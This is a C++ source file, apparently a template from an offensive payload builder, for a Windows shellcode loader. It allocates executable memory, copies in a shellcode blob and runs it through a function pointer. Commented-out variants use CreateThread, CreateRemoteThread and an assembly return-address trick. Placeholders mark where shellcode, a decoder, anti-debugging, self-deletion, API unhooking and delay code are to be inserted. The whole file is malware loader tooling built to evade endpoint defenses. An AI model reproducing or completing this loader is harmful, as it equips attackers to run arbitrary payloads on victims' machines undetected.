// Bison.cpp : Questo file contiene la funzione 'main', in cui inizia e termina l'esecuzione del programma.
//
#define _CRT_SECURE_NO_WARNINGS
#define MAX_ARGS 100
#define MAX_ARG_LENGTH 255

#include <windows.h>
#include <processenv.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

//####USING####

//####DEFINE####

//####CODE####


DWORD WINAPI PsychoBlast(LPVOID lpParameter)
{
    DWORD dwSize;
    //HANDLE currentProcess;

    int length = ####SHELLCODE_LENGTH####;
    unsigned char* encoded = ####SHELLCODE####;

    //####CALL####

    unsigned char* decoded = encoded;

    //currentProcess = GetCurrentProcess();

    printf("[*] Allocating %d bytes of memory\n", length);
    
    // Method 1: No process Specified 
    VOID* mem = VirtualAlloc(NULL, length, 0x00002000 | 0x00001000, PAGE_EXECUTE_READWRITE);

    // Method 2: Specifying current process 
    //VOID* mem = VirtualAllocEx(currentProcess, NULL, length + 1, 0x00002000 | 0x00001000, PAGE_READWRITE);
    if (mem == NULL)
        return -1;
    //VirtualProtect(mem, length, 0x40, &dwSize);

    bool success = false;
    // Method 1: No process Specified

    success = memcpy(mem, decoded, length);

    // Method 2: Specifying current process 
    // success = WriteProcessMemory(currentProcess, mem, decoded, length, &bytesWritten);
    if (!success){
        printf("[-] Oh gosh, something went wrong!\n");
        return -2;
    }
    
    int ret_val = 0;
    printf("[*] Executing\n");
    // Method 1: No process Specified, using function pointer
    //int (*my_main)(char**) = (int(*)(char**)) ((ULONGLONG)mem);
    // With no params, this definition would be good as well
    ((void(*)())mem)();

    //char** args = (char**)lpParameter;

    //ret_val = my_main(args);
    //free(args);

    // Method 2: No process specified, using CreateThread
    //CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, lpParameter, 0, NULL);

    // Method 3: Specifying current process
    //CreateRemoteThread(currentProcess, NULL, 0, (LPTHREAD_START_ROUTINE)mem, lpParameter, 0, NULL);

    /* Method 4: Using Assembly to manipulate return address
    * 1. MOV &mem RCX ---> Store mem on RCX
    * 2. PUSH RCX     ---> Push mem on the stack
    * 3. RET          ---> mem is now in RIP, and gets executed
    asm volatile ("mov %0, %%rcx\n\t"
        "push %%rcx\n\t"
        "ret"
        :
    : "r" (mem));
    */
    printf("[+] The shellcode finished with a return value: %08X\n", ret_val);
    return 0;
}

int main()
{
    //####DELAY####
    //####ANTIDEBUG####
    //####ARGS####
    //####SELF_DELETE####
    //####UNHOOK####

    PsychoBlast(NULL);
}

